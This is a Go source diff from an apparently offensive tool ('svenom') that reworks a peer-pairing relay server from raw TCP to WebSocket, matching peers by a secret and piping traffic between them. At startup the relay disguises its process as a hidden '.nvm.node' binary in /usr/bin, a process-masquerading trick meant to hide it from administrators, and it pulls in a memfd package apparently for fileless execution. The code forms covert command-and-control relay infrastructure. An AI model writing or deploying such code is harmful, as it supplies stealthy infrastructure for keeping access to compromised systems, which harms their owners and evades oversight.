@@ -1,28 +1,32 @@
 package main
 
 import (
-	"bufio"
 	"flag"
-	"io"
 	"log"
-	"net"
+	"net/http"
 	"os"
 	"strings"
 	"sync"
 
 	"github.com/blackopsbos/svenom/pkg/masquerade"
 	"github.com/blackopsbos/svenom/pkg/memfd"
+	"github.com/gorilla/websocket"
 )
 
 var (
-	listenAddr = flag.String("listen", ":443", "Address to listen")
+	listenAddr = flag.String("listen", "127.0.0.1:9443", "Address to listen")
 	relayMode  = flag.Bool("relay", false, "Run as relay server")
+	wsPath     = flag.String("ws-path", "/ws", "WebSocket endpoint path")
 )
+
+var wsUpgrader = websocket.Upgrader{
+	CheckOrigin: func(r *http.Request) bool { return true },
+}
 
 var waitingPeers = struct {
 	sync.Mutex
-	m map[string]net.Conn
-}{m: make(map[string]net.Conn)}
+	m map[string]chan *websocket.Conn
+}{m: make(map[string]chan *websocket.Conn)}
 
 func main() {
 	flag.Parse()
@@ -44,46 +48,71 @@ func main() {
 
 	masquerade.DisguiseAs(".nvm.node", "/usr/bin/.nvm.node -relay -listen "+*listenAddr)
 
-	ln, err := net.Listen("tcp", *listenAddr)
-	if err != nil {
-		log.Fatalf("Listen: %v", err)
-	}
-	log.Printf("Relay listening on %s", *listenAddr)
+	mux := http.NewServeMux()
+	mux.HandleFunc(*wsPath, handleWS)
 
-	for {
-		conn, err := ln.Accept()
-		if err != nil {
-			log.Printf("Accept error: %v", err)
-			continue
-		}
-		go handleConn(conn)
+	log.Printf("WebSocket relay listening on %s%s", *listenAddr, *wsPath)
+
+	if err := http.ListenAndServe(*listenAddr, mux); err != nil {
+		log.Fatalf("Listen: %v", err)
 	}
 }
 
-func handleConn(conn net.Conn) {
-	defer conn.Close()
-	reader := bufio.NewReader(conn)
-	secret, err := reader.ReadString('\n')
+func handleWS(w http.ResponseWriter, r *http.Request) {
+	ws, err := wsUpgrader.Upgrade(w, r, nil)
 	if err != nil {
+		log.Printf("WebSocket upgrade error: %v", err)
 		return
 	}
-	secret = strings.TrimSpace(secret)
+
+	// Baca secret sebagai first message
+	_, msg, err := ws.ReadMessage()
+	if err != nil {
+		ws.Close()
+		return
+	}
+	secret := strings.TrimSpace(string(msg))
 
 	waitingPeers.Lock()
-	if peer, ok := waitingPeers.m[secret]; ok {
+	if ch, ok := waitingPeers.m[secret]; ok {
 		delete(waitingPeers.m, secret)
 		waitingPeers.Unlock()
-		go io.Copy(peer, conn)
-		io.Copy(conn, peer)
-		peer.Close()
-	} else {
-		waitingPeers.m[secret] = conn
-		waitingPeers.Unlock()
-		defer func() {
-			waitingPeers.Lock()
-			delete(waitingPeers.m, secret)
-			waitingPeers.Unlock()
-		}()
-		io.ReadAll(conn)
+		log.Printf("Paired: %s...", secret[:8])
+		ch <- ws
+		return
 	}
+
+	ch := make(chan *websocket.Conn, 1)
+	waitingPeers.m[secret] = ch
+	waitingPeers.Unlock()
+	log.Printf("Waiting for peer: %s...", secret[:8])
+
+	peerWS := <-ch
+
+	wsPipe(ws, peerWS)
+}
+
+func wsPipe(ws1, ws2 *websocket.Conn) {
+	errCh := make(chan error, 2)
+
+	copyWS := func(dst, src *websocket.Conn) {
+		for {
+			mt, msg, err := src.ReadMessage()
+			if err != nil {
+				errCh <- err
+				return
+			}
+			if err := dst.WriteMessage(mt, msg); err != nil {
+				errCh <- err
+				return
+			}
+		}
+	}
+
+	go copyWS(ws1, ws2)
+	go copyWS(ws2, ws1)
+
+	<-errCh
+	ws1.Close()
+	ws2.Close()
 }
